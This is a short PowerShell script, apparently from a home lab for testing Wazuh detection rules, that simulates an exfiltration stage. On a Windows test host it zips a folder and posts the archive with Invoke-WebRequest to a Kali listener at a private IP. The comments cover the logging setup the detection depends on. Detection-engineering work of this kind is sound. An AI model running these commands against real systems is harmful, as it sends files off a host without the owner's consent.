# Stage 11 — Exfiltration (T1059.001, T1567.002)
# Host: Windows 11 victim, run through the reverse shell
# Compresses the FIM-monitored folder and uploads it to Kali via Invoke-WebRequest.
#
# Rewritten to match the current rule 100413, which detects Invoke-WebRequest
# usage through PowerShell Module Logging instead of a destination port.
#
# PREREQUISITES (docs/03 §3.3, docs/04 Stage 11) — not yet met in this repo:
#   1. ossec.conf needs a <localfile> block for Microsoft-Windows-PowerShell/Operational
#      (log_format: eventchannel).
#   2. Module Logging must be enabled via Group Policy:
#      Administrative Templates > Windows Components > Windows PowerShell >
#      Turn on Module Logging (module name list: *)
# Without both, Wazuh will never see this event and 100413 cannot fire.

Compress-Archive -Path C:\Users\LENOVO\Downloads\virustotaltest -DestinationPath C:\Windows\Temp\exfil_test.zip -Force

Invoke-WebRequest -Uri "http://192.168.60.135:4445/upload" -Method Post -InFile C:\Windows\Temp\exfil_test.zip

# Verify integrity against the Kali side after the transfer:
# Get-FileHash C:\Windows\Temp\exfil_test.zip -Algorithm SHA256

# Cleanup after the test:
# Remove-Item C:\Windows\Temp\exfil_test.zip -Force

# NOTICE THAT: Point the Windows Invoke-WebRequest to port 4445, where the Kali script has a netcat listener waiting instead of using port 8000 with http.server
# IF you want to use the http.server , you can use the `curl` or `wget` command for downloading file from window
